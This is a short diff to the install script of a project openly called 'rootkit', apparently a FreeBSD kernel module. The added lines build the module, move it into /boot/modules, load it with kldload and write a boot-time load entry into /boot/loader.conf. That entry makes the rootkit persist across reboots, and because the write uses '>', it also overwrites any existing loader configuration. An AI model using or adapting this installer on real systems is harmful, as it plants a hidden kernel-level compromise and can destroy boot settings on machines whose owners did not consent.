@@ -17,7 +17,13 @@
 #
 
 SRC=$(dirname "$(realpath $0)")
+
+NAME="rootkit"
+KO="$NAME.ko"
 KMOD=$SRC/src/kmod
+
+INSTALL="/boot/modules"
+LOADER_CONF="/boot/loader.conf"
 
 cat << "EOF"
  _                   _ _____     _____     _____
@@ -36,7 +42,9 @@ echo ">> Build rootkit."
 make
 
 echo ">> Install rootkit kernel module."
-make load
+mv $KMOD/$KO $INSTALL/$KO
+kldload $INSTALL/$KO
+echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
 
 if [ "$1" = "DEBUG" ]
 then
